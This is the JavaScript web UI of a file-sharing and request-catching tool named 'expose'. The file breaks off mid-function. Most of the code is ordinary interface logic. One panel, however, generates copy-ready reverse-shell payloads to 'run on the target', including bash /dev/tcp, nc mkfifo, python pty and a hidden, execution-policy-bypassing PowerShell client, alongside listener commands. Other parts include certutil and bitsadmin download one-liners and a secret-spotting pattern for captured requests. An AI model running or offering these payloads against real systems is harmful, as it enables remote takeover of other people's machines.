'use strict';
/* expose — web UI */

// ── utils ─────────────────────────────────────────────────
const q=id=>document.getElementById(id);
function esc(s){const d=document.createElement('span');d.textContent=s;return d.innerHTML}
function ea(s){return esc(s).replace(/"/g,'&quot;')}
function fmt(b){if(b<1024)return b+' B';if(b<1048576)return(b/1024).toFixed(1)+' K';return(b/1048576).toFixed(1)+' M'}
function ago(ts){const s=(Date.now()/1000-ts)|0;
  if(s<45)return'just now';const m=s/60|0;if(m<60)return m+'m ago';
  const h=m/60|0;if(h<24)return h+'h ago';return(h/24|0)+'d ago'}
const MO=['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
function fdate(ts){const d=new Date(ts*1000);
  return MO[d.getMonth()]+' '+d.getDate()+' '+String(d.getHours()).padStart(2,'0')+':'+String(d.getMinutes()).padStart(2,'0')}

let _tt=null;
function toast(t){const el=q('toast');el.textContent=t;el.classList.add('vis');
  clearTimeout(_tt);_tt=setTimeout(()=>el.classList.remove('vis'),1600)}

function copyText(txt,okMsg){
  const done=()=>toast(okMsg||'Copied to clipboard');
  if(navigator.clipboard&&navigator.clipboard.writeText){
    navigator.clipboard.writeText(txt).then(done).catch(()=>fallback());
  }else fallback();
  function fallback(){
    const ta=document.createElement('textarea');ta.value=txt;ta.style.position='fixed';ta.style.opacity='0';
    document.body.appendChild(ta);ta.select();
    try{document.execCommand('copy');done()}catch(_){}
    ta.remove();
  }
}

// ── icons (inline SVG, stroke = currentColor) ─────────────
const I={
  file:'<svg class="ic" viewBox="0 0 24 24"><path d="M14 3H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V8l-5-5z"/><path d="M14 3v5h5"/></svg>',
  folder:'<svg class="ic" viewBox="0 0 24 24"><path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V7z"/></svg>',
  dl:'<svg class="ic" viewBox="0 0 24 24"><path d="M12 4v12m0 0l-4-4m4 4l4-4"/><path d="M4 17v1a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-1"/></svg>',
  copy:'<svg class="ic" viewBox="0 0 24 24"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>',
  trash:'<svg class="ic" viewBox="0 0 24 24"><path d="M4 7h16M10 11v6m4-6v6M6 7l1 12a2 2 0 0 0 2 1h6a2 2 0 0 0 2-1l1-12M9 7V4h6v3"/></svg>',
  x:'<svg class="ic" viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg>',
  act:'<svg class="ic" viewBox="0 0 24 24"><path d="M3 12h4l3 8 4-16 3 8h4"/></svg>',
  up:'<svg class="ic" viewBox="0 0 24 24"><path d="M12 19V5m0 0l-5 5m5-5l5 5"/></svg>',
  sun:'<circle cx="12" cy="12" r="4"/><path d="M12 2v2m0 16v2M4.9 4.9l1.4 1.4m11.4 11.4l1.4 1.4M2 12h2m16 0h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/>',
  moon:'<path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/>',
  auto:'<circle cx="12" cy="12" r="9"/><path d="M12 3a9 9 0 0 1 0 18z" fill="currentColor" stroke="none"/>'
};

// ── theme: auto follows the OS, toggle overrides (persisted) ──
const THEME_KEY='expose-theme';
function themeGet(){try{return localStorage.getItem(THEME_KEY)||'auto'}catch(e){return'auto'}}
function themeApply(t){
  const root=document.documentElement;
  if(t==='auto'){root.removeAttribute('data-theme')}else{root.dataset.theme=t}
  const b=q('theme-toggle');
  b.title='Theme: '+t+(t==='auto'?' (system)':'');
  q('theme-ic').innerHTML=t==='light'?I.sun:t==='dark'?I.moon:I.auto;
}
q('theme-toggle').addEventListener('click',()=>{
  const order=['auto','light','dark'];
  const next=order[(order.indexOf(themeGet())+1)%order.length];
  try{localStorage.setItem(THEME_KEY,next)}catch(e){}
  themeApply(next);
  toast('Theme: '+next+(next==='auto'?' (follows system)':''));
});
themeApply(themeGet());

// ── header actions ────────────────────────────────────────
q('copy-url').addEventListener('click',()=>copyText(location.origin,'Link copied'));

// ── hero: mode-aware context ──────────────────────────────
const BADGE={dir:'blu',catch:'vio',payload:'amb',redirect:'amb'};

fetch('/meta').then(r=>r.json()).then(m=>{
  const hero=q('hero'),badge=q('mode-badge');
  const mode=m.mode||'text';
  badge.textContent=mode;
  if(BADGE[mode])badge.classList.add(BADGE[mode]);
  hero.hidden=false;

  if(mode==='file'){
    hero.innerHTML='<div class="hero-lbl">Sharing a file</div>'+
      '<div class="hero-file"><span class="fic">'+I.file+'</span>'+
      '<div><div class="fnm">'+esc(m.name)+'</div>'+
      '<div class="fmeta">'+fmt(m.size)+' &middot; '+esc(m.mime||'unknown')+'</div></div>'+
      '<div class="sp"></div><div class="hero-acts">'+
      '<a class="btn primary" href="/content" download="'+ea(m.name)+'">'+I.dl+'Download</a>'+
      '<button class="btn ghost" id="h-copy">'+I.copy+'Copy link</button></div></div>';
    q('h-copy').addEventListener('click',()=>copyText(location.origin+'/content','Link copied'));

  }else if(mode==='dir'){
    hero.innerHTML='<div class="hero-lbl">Sharing a directory</div>'+
      '<div class="dir-host" title="Directory on this machine">'+esc(m.path||'')+'</div>'+
      '<div class="crumbs" id="crumbs"></div><div id="direntries"></div>';
    loadDir(location.hash.slice(1)||'/');

  }else if(mode==='catch'){
    hero.innerHTML='<div class="hero-catch"><span class="radar">'+I.act+'</span>'+
      '<h3>Request catcher is live</h3>'+
      '<p>Point a webhook or send any request here — full headers and body show up in the request log below and in the operator&rsquo;s terminal.</p>'+
      '<span class="curl-chip"><span id="curl-sample"></span>'+
      '<button class="iconbtn" id="h-curl" title="Copy curl command">'+I.copy+'</button></span></div>';
    const sample='curl -X POST '+location.origin+' -d \'{"hello":"world"}\'';
    q('curl-sample').textContent=sample;
    q('h-curl').addEventListener('click',()=>copyText(sample,'curl command copied'));

  }else{
    // text / payload / redirect / anything else that serves /content
    const label=mode==='text'?'Sharing text':mode==='payload'?'Sharing a payload':'Serving '+mode;
    fetch('/content').then(r=>r.text()).then(t=>{
      if(!t){hero.hidden=true;return}
      hero.innerHTML='<div class="hero-lbl">'+esc(label)+'</div>'+
        '<pre class="hero-text" id="h-text"></pre>'+
        '<div class="hero-acts"><button class="btn ghost" id="h-copy">'+I.copy+'Copy</button></div>';
      q('h-text').textContent=t;
      q('h-copy').addEventListener('click',()=>copyText(t,'Copied to clipboard'));
    }).catch(()=>{hero.hidden=true});
  }
}).catch(()=>{});

// ── directory browser ─────────────────────────────────────
function loadDir(path){
  history.replaceState(null,'','#'+path);
  fetch('/ls'+(path==='/'?'':path)).then(r=>r.json()).then(d=>{
    const cr=q('crumbs'),el=q('direntries');
    if(cr){
      let bc='<a href="#" data-d="/">root</a>';
      if(d.path&&d.path!=='/'){
        const ps=d.path.replace(/^\/|\/$/g,'').split('/');
        let acc='';
        ps.forEach((p,i)=>{acc+='/'+p;
          bc+='<span class="fsep">/</span>'+(i===ps.length-1
            ?'<span class="cur">'+esc(p)+'</span>'
            :'<a href="#" data-d="'+ea(acc)+'">'+esc(p)+'</a>');});
      }
      cr.innerHTML=bc;
      cr.querySelectorAll('a').forEach(a=>a.addEventListener('click',e=>{e.preventDefault();loadDir(a.dataset.d)}));
    }
    if(!el)return;
    el.innerHTML='';
    const rows=[];
    if(d.parent!=null)rows.push({name:'..',type:'dir',up:d.parent});
    d.entries.forEach(e=>rows.push(e));
    if(!rows.length){el.innerHTML='<div class="dir-empty">empty directory</div>';return}
    rows.forEach((e,i)=>{
      const row=document.createElement('div');
      const dp=(d.path==='/'?'/':d.path+'/')+e.name;
      if(e.type==='dir'){
        row.className='de is-dir';
        const target=e.up!=null?e.up:dp;
        row.innerHTML=I.folder+'<span class="fn"><a href="#" data-d="'+ea(target)+'">'+esc(e.name)+'/</a></span><span class="fs"></span><span class="fd"></span>';
        row.querySelector('a').addEventListener('click',ev=>{ev.preventDefault();loadDir(target)});
      }else{
        row.className='de';
        const href=encodeURI(dp);
        row.innerHTML=I.file+'<span class="fn"><a href="'+href+'" download>'+esc(e.name)+'</a></span>'+
          '<span class="fs">'+fmt(e.size)+'</span><span class="fd">'+(e.mtime?fdate(e.mtime):'')+'</span>';
      }
      row.style.animationDelay=Math.min(i*18,300)+'ms';
      el.appendChild(row);
    });
  }).catch(()=>{});
}

// ── upload ────────────────────────────────────────────────
let F=[];
const drop=q('drop'),fi=q('fi'),queue=q('queue'),upActs=q('up-acts'),
      sendBtn=q('send'),clrBtn=q('clr'),prog=q('prog'),bar=q('bar'),msg=q('msg');

function addFiles(nf){for(const f of nf)if(!F.some(x=>x.name===f.name&&x.size===f.size))F.push(f);renderQueue()}
function renderQueue(){
  queue.innerHTML='';
  F.forEach((f,i)=>{
    const d=document.createElement('div');d.className='qi';d.style.animationDelay=Math.min(i*25,250)+'ms';
    d.innerHTML=I.file+'<span class="qn" title="'+ea(f.name)+'">'+esc(f.name)+'</span>'+
      '<span class="qs">'+fmt(f.size)+'</span>'+
      '<button class="iconbtn dgr" data-i="'+i+'" aria-label="Remove">'+I.x+'</button>';
    queue.appendChild(d)});
  q('send-n').textContent=F.length>1?'('+F.length+')':'';
  upActs.hidden=!F.length;
  msg.className='up-msg';msg.textContent='';
}
queue.addEventListener('click',e=>{const b=e.target.closest('.iconbtn');if(b){F.splice(+b.dataset.i,1);renderQueue()}});
clrBtn.addEventListener('click',()=>{F=[];renderQueue()});

drop.addEventListener('click',e=>{if(!e.target.closest('.linklike'))fi.click()});
q('browse').addEventListener('click',()=>fi.click());
drop.addEventListener('keydown',e=>{if(e.key==='Enter'||e.key===' '){e.preventDefault();fi.click()}});
fi.addEventListener('change',()=>{addFiles(fi.files);fi.value=''});

drop.addEventListener('dragover',e=>{e.preventDefault();drop.classList.add('over')});
drop.addEventListener('dragleave',e=>{if(!drop.contains(e.relatedTarget))drop.classList.remove('over')});
drop.addEventListener('drop',e=>{e.preventDefault();drop.classList.remove('over');addFiles(e.dataTransfer.files)});

// page-wide drag overlay
const overlay=q('overlay');
let dragDepth=0;
window.addEventListener('dragenter',e=>{
  if(!e.dataTransfer||![...e.dataTransfer.types].includes('Files'))return;
  dragDepth++;overlay.hidden=false});
window.addEventListener('dragleave',()=>{dragDepth=Math.max(0,dragDepth-1);if(!dragDepth)overlay.hidden=true});
window.addEventListener('dragover',e=>e.preventDefault());
window.addEventListener('drop',e=>{
  e.preventDefault();dragDepth=0;overlay.hidden=true;
  if(e.dataTransfer&&e.dataTransfer.files.length)addFiles(e.dataTransfer.files)});

sendBtn.addEventListener('click',()=>{
  if(!F.length)return;
  sendBtn.disabled=true;prog.hidden=false;bar.style.width='0';
  const fd=new FormData();F.forEach(f=>fd.append('files',f));
  const xhr=new XMLHttpRequest();xhr.open('POST','/upload');
  xhr.upload.onprogress=e=>{if(e.lengthComputable)bar.style.width=(e.loaded/e.total*100)+'%'};
  xhr.onload=()=>{bar.style.width='100%';
    try{const r=JSON.parse(xhr.responseText);
      msg.textContent=r.count+' file'+(r.count!==1?'s':'')+' received by the host';
      msg.className='up-msg ok';F=[];renderQueue();loadDisk();
    }catch(e){msg.textContent='transfer failed — unexpected response';msg.className='up-msg err'}
    sendBtn.disabled=false;setTimeout(()=>{prog.hidden=true;bar.style.width='0'},1400)};
  xhr.onerror=()=>{msg.textContent='connection lost — is the server still up?';msg.className='up-msg err';
    sendBtn.disabled=false;prog.hidden=true};
  xhr.send(fd)});

// ── received files ────────────────────────────────────────
const disk=q('disk'),recvN=q('recv-n');

function loadDisk(){
  fetch('/upload/files').then(r=>r.json()).then(files=>{
    recvN.textContent=files.length?files.length+' file'+(files.length!==1?'s':'')+' on this machine':'';
    disk.innerHTML='';
    if(!files.length){disk.innerHTML='<div class="disk-empty">nothing received yet — files people send appear here</div>';return}
    files.forEach((f,i)=>{
      const d=document.createElement('div');d.className='di';d.style.animationDelay=Math.min(i*20,300)+'ms';
      d.innerHTML=I.file+
        '<div><div class="dn" title="'+ea(f.name)+'">'+esc(f.name)+'</div>'+
        '<div class="dm">'+fmt(f.size)+(f.mtime?' &middot; '+ago(f.mtime):'')+'</div></div>'+
        '<div class="da">'+
          '<button class="iconbtn dcp" title="Copy link" aria-label="Copy link">'+I.copy+'</button>'+
          '<a class="iconbtn" title="Download" aria-label="Download" href="/upload/files/'+encodeURIComponent(f.name)+'" download>'+I.dl+'</a>'+
          '<button class="iconbtn dgr dx" title="Delete" aria-label="Delete" data-n="'+ea(f.name)+'">'+I.trash+'</button>'+
        '</div>';
      disk.appendChild(d)});
  }).catch(()=>{})}

disk.addEventListener('click',e=>{
  const cp=e.target.closest('.dcp');
  if(cp){
    const name=cp.closest('.di').querySelector('.dn').textContent;
    copyText(location.origin+'/upload/files/'+encodeURIComponent(name),'Link copied');
    return}
  const b=e.target.closest('.dx');
  if(!b)return;
  if(b.dataset.armed){
    delete b.dataset.armed;
    fetch('/upload/files/'+encodeURIComponent(b.dataset.n),{method:'DELETE'})
      .then(r=>r.json()).then(r=>{if(r.ok){loadDisk();toast('Deleted '+b.dataset.n)}}).catch(()=>{});
  }else{
    b.dataset.armed='1';b.closest('.di').classList.add('confirm');
    b.innerHTML='<span style="font-size:10.5px;font-weight:700">sure?</span>';
    setTimeout(()=>{if(b.isConnected&&b.dataset.armed){
      delete b.dataset.armed;b.closest('.di').classList.remove('confirm');b.innerHTML=I.trash}},2500);
  }});

loadDisk();

// ── CLI one-liners ────────────────────────────────────────
(function(){
  const U=location.origin,H=location.hostname,
        P=location.port||(location.protocol==='https:'?'443':'80');
  const sub=s=>s.replaceAll('{U}',U).replaceAll('{H}',H).replaceAll('{P}',P);
  // upload  → POST /upload (multipart, field "files") — lands in ~/Downloads/expose
  // chat    → POST /chat (raw body) — appears in the chat panel
  // download→ GET  /content — the shared text/file
  const CMDS={
    linux:{
      upload:[
        ['curl','curl -F "files=@/etc/hostname" {U}/upload'],
        ['httpie','http --form POST {U}/upload files@/etc/hostname'],
        ['python3 · requests',`python3 -c "import requests;print(requests.post('{U}/upload',files={'files':open('/etc/hostname','rb')}).text)"`],
        ['python3 · stdlib',`python3 -c "import urllib.request,uuid;b=uuid.uuid4().hex;d=open('/etc/hostname','rb').read();body=('--'+b+'\\r\\nContent-Disposition: form-data; name=\\"files\\"; filename=\\"hostname\\"\\r\\n\\r\\n').encode()+d+('\\r\\n--'+b+'--\\r\\n').encode();r=urllib.request.Request('{U}/upload',data=body,headers={'Content-Type':'multipart/form-data; boundary='+b});print(urllib.request.urlopen(r).read().decode())"`],
      ],
      chat:[
        ['curl',`curl -d 'hello from curl' {U}/chat`],
        ['wget',`wget -qO- --post-data 'hello from wget' {U}/chat`],
        ['nc',`m='hello from nc';printf "POST /chat HTTP/1.1\\r\\nHost: {H}\\r\\nContent-Length: \${#m}\\r\\nConnection: close\\r\\n\\r\\n$m" | nc {H} {P}`],
        ['python3',`python3 -c "import urllib.request;print(urllib.request.urlopen(urllib.request.Request('{U}/chat',data=b'hello from python')).read().decode())"`],
        ['socat',`m='hello from socat';printf "POST /chat HTTP/1.1\\r\\nHost: {H}\\r\\nContent-Length: \${#m}\\r\\nConnection: close\\r\\n\\r\\n$m" | socat - TCP:{H}:{P}`],
      ],
      download:[
        ['curl','curl -OJ {U}/content'],
        ['wget','wget {U}/content -O downloaded'],
        ['python3',`python3 -c "import urllib.request;open('downloaded','wb').write(urllib.request.urlopen('{U}/content').read())"`],
      ],
    },
    macos:{
      upload:[
        ['curl','curl -F "files=@/etc/hostname" {U}/upload'],
        ['httpie · brew','http --form POST {U}/upload files@/etc/hostname'],
        ['python3 · stdlib',`python3 -c "import urllib.request,uuid;b=uuid.uuid4().hex;d=open('/etc/hostname','rb').read();body=('--'+b+'\\r\\nContent-Disposition: form-data; name=\\"files\\"; filename=\\"hostname\\"\\r\\n\\r\\n').encode()+d+('\\r\\n--'+b+'--\\r\\n').encode();r=urllib.request.Request('{U}/upload',data=body,headers={'Content-Type':'multipart/form-data; boundary='+b});print(urllib.request.urlopen(r).read().decode())"`],
      ],
      chat:[
        ['curl',`curl -d 'hello from mac' {U}/chat`],
        ['wget · brew',`wget -qO- --post-data 'hello from wget' {U}/chat`],
        ['nc',`m='hello from nc';printf "POST /chat HTTP/1.1\\r\\nHost: {H}\\r\\nContent-Length: \${#m}\\r\\nConnection: close\\r\\n\\r\\n$m" | nc {H} {P}`],
        ['python3',`python3 -c "import urllib.request;print(urllib.request.urlopen(urllib.request.Request('{U}/chat',data=b'hello from python')).read().decode())"`],
      ],
      download:[
        ['curl','curl -OJ {U}/content'],
        ['wget · brew','wget {U}/content -O downloaded'],
      ],
    },
    windows:{
      upload:[
        ['curl.exe','curl.exe -F "files=@C:\\Windows\\win.ini" {U}/upload'],
        ['PowerShell 7+','powershell -c "Invoke-RestMethod {U}/upload -Method Post -Form @{files=Get-Item C:\\Windows\\win.ini}"'],
        ['python',`python -c "import requests;print(requests.post('{U}/upload',files={'files':open(r'C:\\\\Windows\\\\win.ini','rb')}).text)"`],
      ],
      chat:[
        ['curl.exe','curl.exe -d "hello from windows" {U}/chat'],
        ['PowerShell',`powershell -c "irm {U}/chat -Method Post -Body 'hello from powershell'"`],
        ['python',`python -c "import urllib.request;print(urllib.request.urlopen(urllib.request.Request('{U}/chat',data=b'hello')).read().decode())"`],
      ],
      download:[
        ['curl.exe','curl.exe -o out.txt {U}/content'],
        ['PowerShell','powershell -c "iwr {U}/content -OutFile C:\\Temp\\out.txt"'],
        ['certutil','certutil -urlcache -split -f {U}/content C:\\Temp\\out.txt'],
        ['bitsadmin','bitsadmin /transfer job {U}/content C:\\Temp\\out.txt'],
      ],
    },
  };
  const GROUPS=[['upload','Upload a file','lands in ~/Downloads/expose on this machine'],
                ['chat','Post a chat message','shows up in the chat panel'],
                ['download','Download shared content','whatever is being served right now']];
  const box=q('cmds');
  let os='linux';

  // collapsed by default — click the header to expand
  q('cli-h').addEventListener('click',e=>{
    if(e.target.closest('.os-pill'))return;
    q('cli-card').classList.toggle('collapsed')});

  function render(){
    let h='';
    for(const[g,label,hint]of GROUPS){
      h+='<div class="cmd-g"><h4>'+label+' &middot; '+hint+'</h4>';
      CMDS[os][g].forEach(([tool,cmd],i)=>{
        h+='<div class="cmd"><span class="cmd-t">'+esc(tool)+'</span>'+
           '<code class="cmd-c">'+esc(sub(cmd))+'</code>'+
           '<button class="iconbtn cmd-copy" data-c="'+ea(sub(cmd))+'" title="Copy command" aria-label="Copy command">'+I.copy+'</button></div>';
      });
      h+='</div>';
    }
    box.innerHTML=h;
  }
  box.addEventListener('click',e=>{
    const b=e.target.closest('.cmd-copy');if(!b)return;
    copyText(b.dataset.c,'Command copied')});
  q('os-pills').addEventListener('click',e=>{
    const p=e.target.closest('.os-pill');if(!p)return;
    os=p.dataset.os;
    q('os-pills').querySelectorAll('.os-pill').forEach(x=>x.classList.toggle('active',x===p));
    render()});
  render();
})();

// ── reverse shells ────────────────────────────────────────
(function(){
  const hostIn=q('rs-host'),portIn=q('rs-port'),box=q('rcmds');
  hostIn.value=location.hostname;portIn.value='4444';
  const PS_BODY=`$client = New-Object System.Net.Sockets.TCPClient('{H}',{P});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
  const ZSH=`zsh -c 'zmodload zsh/net/tcp && ztcp {H} {P} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'`;
  const BASH=`bash -i >& /dev/tcp/{H}/{P} 0>&1`;
  const NCFIFO=`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {H} {P} >/tmp/f`;
  const PY3=`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{H}",{P}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`;
  const RS={
    linux:[
      ['bash',BASH],
      ['bash -c',`bash -c 'bash -i >& /dev/tcp/{H}/{P} 0>&1'`],
      ['zsh',ZSH],
      ['nc -e · trad.',`nc {H} {P} -e /bin/bash`],
      ['nc · mkfifo',NCFIFO],
      ['python3',PY3,'best'],
      ['socat',`socat TCP:{H}:{P} EXEC:'bash -li',pty,stderr,setsid,sigint,sane`,'best TTY'],
    ],
    macos:[
      ['zsh',ZSH,'best'],
      ['bash',BASH],
      ['nc · mkfifo',NCFIFO],
      ['python3',PY3,'best TTY'],
    ],
    windows:[
      ['PowerShell','powershell -nop -c "'+PS_BODY+'"','best'],
      ['PS · bypass','powershell -nop -W hidden -ep bypass -c "'+PS_BODY+'"'],
      ['ncat',`ncat.exe {H} {P} -e cmd.exe`],
    ],
  };
  const LISTENER=[
    ['nc',`nc -lvnp {P}`],
    ['rlwrap · nc',`rlwrap nc -lvnp {P}`],
    ['socat · tty',`socat file:/dev/tty,raw,echo=0 tcp-listen:{P}`,'best'],
  ];
  let os='linux';
  const cur=()=>({h:(hostIn.value||'CHANGE_ME').trim()||'CHANGE_ME',
                  p:(portIn.value||'4444').trim()||'4444'});
  const sub=s=>{const{h,p}=cur();return s.replaceAll('{H}',h).replaceAll('{P}',p)};

  function group(title,hint,rows){
    let h='<div class="cmd-g"><h4>'+title+' &middot; '+hint+'</h4>';
    rows.forEach(([tool,cmd,best])=>{
      h+='<div class="cmd"><span class="cmd-t">'+esc(tool)+
         (best?'<span class="cmd-best">'+esc(best)+'</span>':'')+'</span>'+
         '<code class="cmd-c">'+esc(sub(cmd))+'</code>'+
         '<button class="iconbtn cmd-copy" data-c="'+ea(sub(cmd))+'" title="Copy command" aria-label="Copy command">'+I.copy+'</button></div>';
    });
    return h+'</div>';
  }
  function render(){
    box.innerHTML=group('Start a listener','run on your machine first',LISTENER)+
                  group('Run on the target','connects back to you',RS[os]);
  }
  box.addEventListener('click',e=>{
    const b=e.target.closest('.cmd-copy');if(!b)return;
    copyText(b.dataset.c,'Command copied')});
  q('rs-pills').addEventListener('click',e=>{
    const p=e.target.closest('.os-pill');if(!p)return;
    os=p.dataset.os;
    q('rs-pills').querySelectorAll('.os-pill').forEach(x=>x.classList.toggle('active',x===p));
    render()});
  hostIn.addEventListener('input',render);
  portIn.addEventListener('input',render);
  q('rs-h').addEventListener('click',e=>{
    if(e.target.closest('.os-pill')||e.target.closest('.rs-in'))return;
    q('rs-card').classList.toggle('collapsed')});
  render();
})();

// ── request log drawer ────────────────────────────────────
(function(){
  const lp=q('log'),lpBar=q('log-bar'),lpBody=q('log-body'),lpBadge=q('log-badge'),
        lpSearch=q('log-search'),lpEmpty=q('log-empty'),live=q('live'),
        btnPause=q('log-pause'),btnExport=q('log-export'),btnClear=q('log-clear');
  let entries=[],lastN=0,paused=false,autoScroll=true,filter='';
  const openRows=new Set();   // n of expanded entries — survives re-renders

  function toggleLog(force){
    const willCollapse=force!=null?force:lp.classList.contains('collapsed')?false:true;
    lp.classList.toggle('collapsed',willCollapse);
    document.body.classList.toggle('log-open',!willCollapse);
  }
  lpBar.addEventListener('click',e=>{
    if(e.target.closest('.log-search')||e.target.closest('.btn')||e.target.closest('input'))return;
    toggleLog()});
  lpBar.addEventListener('keydown',e=>{if(e.key==='Enter'&&e.target===lpBar)toggleLog()});
  document.addEventListener('keydown',e=>{
    if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA')return;
    if(e.key==='l'||e.key==='L'){e.preventDefault();toggleLog()}});

  lpSearch.addEventListener('input',()=>{filter=lpSearch.value.toLowerCase();renderAll()});
  lpSearch.addEventListener('click',e=>e.stopPropagation());

  btnPause.addEventListener('click',e=>{e.stopPropagation();paused=!paused;
    btnPause.textContent=paused?'resume':'pause';
    btnPause.classList.toggle('active',paused);
    live.classList.toggle('paused',paused)});

  btnExport.addEventListener('click',e=>{e.stopPropagation();
    const json=JSON.stringify(entries,null,2);
    if(navigator.clipboard&&navigator.clipboard.writeText){
      navigator.clipboard.writeText(json).then(()=>toast('Log copied as JSON')).catch(()=>dlJson(json));
    }else dlJson(json)});
  function dlJson(txt){const b=new Blob([txt],{type:'application/json'});
    const a=document.createElement('a');a.href=URL.createObjectURL(b);
    a.download='expose-log.json';a.click();URL.revokeObjectURL(a.href)}

  btnClear.addEventListener('click',e=>{e.stopPropagation();
    fetch('/log/clear',{method:'POST'}).then(()=>{
      entries=[];lastN=0;openRows.clear();renderAll();toast('Log cleared')}).catch(()=>{})});

  lpBody.addEventListener('scroll',()=>{
    autoScroll=lpBody.scrollHeight-lpBody.scrollTop-lpBody.clientHeight<30});

  // ── new-request sound ──
  const btnSound=q('log-sound');
  let soundOn=false,painted=false,audioCtx=null;
  try{soundOn=localStorage.getItem('expose-sound')==='1'}catch(e){}
  btnSound.classList.toggle('active',soundOn);
  btnSound.addEventListener('click',e=>{e.stopPropagation();
    soundOn=!soundOn;
    try{localStorage.setItem('expose-sound',soundOn?'1':'0')}catch(e2){}
    btnSound.classList.toggle('active',soundOn);
    if(soundOn)blip()});
  function blip(){
    if(!soundOn)return;
    try{
      audioCtx=audioCtx||new(window.AudioContext||window.webkitAudioContext)();
      if(audioCtx.state==='suspended')audioCtx.resume();
      const t=audioCtx.currentTime;
      [880,660].forEach((f,i)=>{
        const o=audioCtx.createOscillator(),g=audioCtx.createGain();
        o.type='sine';o.frequency.value=f;
        o.connect(g);g.connect(audioCtx.destination);
        g.gain.setValueAtTime(0.0001,t+i*0.09);
        g.gain.exponentialRampToValueAtTime(0.1,t+i*0.09+0.02);
        g.gain.exponentialRampToValueAtTime(0.0001,t+i*0.09+0.14);
        o.start(t+i*0.09);o.stop(t+i*0.09+0.15)});
    }catch(e){}}

  // ── stats popover (click the count badge) ──
  const statsEl=q('stats');
  lpBadge.addEventListener('click',e=>{
    e.stopPropagation();
    if(statsEl.hidden){renderStats();statsEl.hidden=false}else statsEl.hidden=true});
  document.addEventListener('click',e=>{
    if(!statsEl.hidden&&!e.target.closest('#stats')&&!e.target.closest('#log-badge'))
      statsEl.hidden=true});
  function renderStats(){
    const ips={},mth={},paths={};
    entries.forEach(en=>{
      ips[en.ip]=(ips[en.ip]||0)+1;
      mth[en.method]=(mth[en.method]||0)+1;
      paths[en.path]=(paths[en.path]||0)+1});
    const top=(o,n)=>Object.entries(o).sort((a,b)=>b[1]-a[1]).slice(0,n);
    let h='<h4>Overview &middot; '+entries.length+' requests &middot; '+
          Object.keys(ips).length+' clients</h4><div class="st-chips">';
    for(const[m,c]of top(mth,8))h+='<span class="st-chip">'+esc(m)+' '+c+'</span>';
    h+='</div><h4>Top clients</h4>';
    for(const[ip,c]of top(ips,5))h+='<div class="st-row"><span class="st-k">'+esc(ip)+'</span><b>'+c+'</b></div>';
    h+='<h4>Top paths</h4>';
    for(const[p,c]of top(paths,5))h+='<div class="st-row"><span class="st-k" title="'+ea(p)+'">'+esc(p)+'</span><b>'+c+'</b></div>';
    statsEl.innerHTML=h}

  function matchesFilter(e){
    if(!filter)return true;
    const hay=[e.method,e.path,e.code,e.ip,e.ua,e.host||'',e.referer||'',
               e.cookie||'',e.origin||'',e.xff||e.x_forwarded_for||'',e.content_type||'',
               e.auth||e.authorization||'',e.body||''].join(' ').toLowerCase();
    return hay.includes(filter)}

  function hl(text){
    if(!filter||!text)return esc(String(text));
    const s=esc(String(text)),fl=filter.replace(/[.*+?^${}()|[\]\\]/g,'\\$&');
    return s.replace(new RegExp('('+fl+')','gi'),'<span class="le-hl">$1</span>')}

  function methodClass(m){return(m||'').toLowerCase().replace(/[^a-z]/g,'')}
  function codeClass(c){const s=String(c||'')[0];return s>='2'&&s<='5'?'c'+s:''}

  // credential / secret spotter (bodies only)
  const SECRET_RE=/(passw(or)?d|pwd|secret|token|api[-_]?key|apikey|authorization|credential|session[-_]?id|private[-_]?key)/i;

  // decode request bodies: JSON pretty-print, JWT decode, form-urlencoded
  function b64d(s){s=s.replace(/-/g,'+').replace(/_/g,'/');while(s.length%4)s+='=';
    try{return decodeURIComponent(escape(atob(s)))}catch(e){try{return atob(s)}catch(e2){return''}}}
  function smartBody(raw){
    const t=String(raw).trim();
    if(!t)return{kind:'raw',text:raw};
    try{return{kind:'json',text:JSON.stringify(JSON.parse(t),null,2)}}catch(_){}
    if(/^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$/.test(t)){
      try{
        const parts=t.split('.');
        const dec=s=>JSON.stringify(JSON.parse(b64d(s)),null,2);
        let out='// header\n'+dec(parts[0])+'\n// payload\n'+dec(parts[1]);
        return{kind:'jwt',text:out};
      }catch(_){}
    }
    if(/^[^=&\s]+=[^&]*(&[^=&\s]+=[^&]*)*$/.test(t)){
      try{
        return{kind:'form',text:t.split('&').map(p=>{
          const i=p.indexOf('=');
          return decodeURIComponent(p.slice(0,i))+' = '+decodeURIComponent(p.slice(i+1));
        }).join('\n')};
      }catch(_){}
    }
    return{kind:'raw',text:raw};
  }

  function buildCurl(e){
    let c='curl';
    if(e.method!=='GET')c+=' -X '+e.method;
    c+=" '"+location.origin+e.path+"'";
    const skip=new Set(['method','path','code','n','ts','time','httpver','ip','port','ua','body']);
    if(e.ua&&e.ua!=='-')c+=" \\\n  -H 'User-Agent: "+e.ua+"'";
    for(const[k,v]of Object.entries(e)){
